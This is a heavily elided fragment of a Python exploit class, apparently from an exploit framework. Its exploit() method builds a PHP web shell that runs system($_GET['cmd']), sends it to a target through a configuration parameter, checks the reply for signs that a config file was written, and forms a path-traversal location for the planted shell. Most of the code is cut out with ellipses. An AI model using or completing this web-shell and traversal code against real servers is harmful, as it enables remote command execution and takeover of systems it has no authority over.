    ...
    def exploit(self) -> bool:
        ...
        for shell_location in self.shell_locations:
            try:
                ...
                php_shell = f"<?php echo '{self.detection_string}'; system($_GET['cmd']); ?>"
                ...
                # Make the request
                response = self.session.get(
                    self.target.format(config_param),
                    timeout=self.timeout
                )
                
                # Check for successful config creation
                if "configuration written" in response.text.lower() or "created" in response.text.lower():
                    ...
                    if shell_location.startswith("/tmp/"):
                        ...
                        shell_path = "../../../../var/tmp/shell_{}".format(self.shell_token)
